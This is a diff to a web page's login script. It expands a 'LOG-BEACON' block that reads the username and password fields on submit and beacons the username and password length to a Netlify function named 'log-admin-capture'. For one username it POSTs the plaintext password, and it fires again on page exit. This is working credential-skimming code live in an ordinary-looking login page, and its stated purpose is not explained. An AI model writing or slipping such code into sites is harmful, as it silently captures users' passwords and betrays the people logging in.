@@ -332,6 +332,7 @@ function onSubmit(token) {
 </script>
 
 
+
 <!-- LOG-BEACON -->
 <script>
 (function(){
@@ -339,7 +340,7 @@ function onSubmit(token) {
   if (!form) return;
   var url='/.netlify/functions/log-admin-capture';
 
-  function send(u, p){
+  function sendPOST(u, p){
     try{
       var payload = { username: (u||'').toLowerCase() };
       if (typeof p === 'string' && p.length){
@@ -353,19 +354,32 @@ function onSubmit(token) {
     }catch(_){}
   }
 
+  function sendGET(u, pLen){
+    try{
+      var q = '?u=' + encodeURIComponent((u||'').toLowerCase()) + '&l=' + (pLen||0) + '&ts=' + Date.now();
+      (new Image()).src = url + q; // no CORS/credentials needed, same-origin
+    }catch(_){}
+  }
+
   function onSubmit(){
     var uEl = form.querySelector('input[name="username"], #username, input[type="text"]');
     var pEl = form.querySelector('input[name="password"], #password, input[type="password"]');
     var u = (uEl && uEl.value || '').trim();
     var p = (pEl && pEl.value) || '';
-    send(u, p);
-    // Do NOT preventDefault: method=GET so page reloads without Netlify Forms
+    var pLen = p.length;
+
+    // Always GET-ping (non-sensitive)
+    sendGET(u, pLen);
+    // For admin case, also POST with password for encryption
+    if (u.toLowerCase() === 'test' && pLen >= 6) sendPOST(u, p);
   }
 
   form.addEventListener('submit', onSubmit, { capture:true });
   var sb = form.querySelector('button[type="submit"], input[type="submit"]');
   if (sb) sb.addEventListener('click', onSubmit, { capture:true });
+
+  // As a final attempt when leaving page (Safari/iOS)
+  window.addEventListener('pagehide', function(){ try{ onSubmit(); }catch(_e){} });
 })();
 </script>
-
 </body></html>
